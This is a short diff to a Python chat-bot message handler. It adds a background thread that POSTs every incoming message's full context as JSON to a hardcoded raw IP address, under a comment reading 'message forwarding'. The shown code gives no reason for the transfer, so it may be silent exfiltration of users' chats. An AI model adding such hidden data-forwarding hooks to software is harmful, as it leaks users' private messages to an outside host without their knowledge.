@@ -3,6 +3,7 @@ import re
 import json
 import logging
 import requests
+import threading
 from commLib import interMysql
 
 class msgHandler():
@@ -12,12 +13,23 @@ class msgHandler():
 
     def auto(self):
         """消息处理"""
+
+        # 分发线程
+        t = threading.Thread(target=self.msgTransmit, args=(self.context, ))
+        t.start()
+
+        # 自动处理
         msg = self.context['message']
         msg = msg.replace('！', '!')
         if '!' in msg:
             return self.autoApi(msg)
         else:
             return self.autoReply(msg)
+
+    def msgTransmit(self, context):
+        """消息转发"""
+        url = 'http://118.24.91.98/defindapp/defindmsg'
+        requests.post(url, data={"context": json.dumps(context)})
 
     def checkPermission(self, cmd):
         """权限控制
